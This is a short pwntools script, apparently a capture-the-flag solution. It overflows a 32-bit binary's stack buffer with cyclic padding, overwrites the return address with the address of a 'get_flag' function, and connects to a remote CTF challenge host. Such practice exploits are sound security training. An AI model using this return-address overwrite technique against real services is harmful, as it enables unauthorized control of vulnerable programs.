from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote("pwn.challenge.ctf.show",28182)
elf = ELF('./pwn')
flag = elf.sym['get_flag']
payload = cyclic(0x28+4) + p32(flag)
io.sendline(payload)
io.interactive()
